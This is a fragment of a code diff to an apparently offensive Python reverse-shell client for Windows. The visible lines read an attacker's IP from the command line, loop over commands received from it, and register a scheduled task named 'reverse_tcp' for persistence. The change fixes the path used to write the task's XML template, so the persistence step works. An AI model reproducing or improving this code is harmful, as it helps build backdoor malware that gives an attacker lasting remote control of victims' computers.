@@ -91,7 +91,7 @@ if (platform.system() == "Windows"):
         ### The the name of schedule task is reverse_tcp
         os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
 
-        
+
 if len(sys.argv) >= 2:
     attacker_ip = sys.argv[1]       ## get attacker's ip from command line
 else:
@@ -114,7 +114,7 @@ while True:
             minutes = int(command[9:])
 
             ## create template
-            xml = open("%Appdata%\\schtasks_template.xml", "w");
+            xml = open(os.getenv("APPDATA") + "\\schtasks_template.xml", "w");
             xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
             xml.close()
 
